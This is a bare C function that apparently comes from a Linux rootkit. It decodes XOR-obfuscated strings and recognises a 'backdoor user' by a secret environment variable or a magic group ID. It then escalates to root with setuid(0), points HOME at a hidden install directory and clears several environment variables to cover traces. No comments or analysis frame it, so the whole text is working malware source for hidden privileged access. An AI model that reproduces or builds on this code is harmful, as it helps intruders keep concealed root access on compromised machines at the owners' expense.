int is_bdusr(void)
{
    int obd=0,i;
    char *bdenv=strdup(BD_ENV); xor(bdenv);
    if((getenv(bdenv) != NULL && getuid() == 0) || getgid() == MGID)
    {
        setuid(0);

        char _idir[256], *idir=strdup(IDIR); xor(idir);
        snprintf(_idir, sizeof(_idir), "HOME=%s", idir);
        putenv(_idir); CLEAN(idir);

        for(i=0;i<USETENVS_SIZE;i++)
        {
            char *current_env=strdup(usetenvs[i]); xor(current_env);
            (void) unsetenv(current_env);
            CLEAN(current_env);
        }

        obd=1;
    }
    CLEAN(bdenv);
    return obd;
}
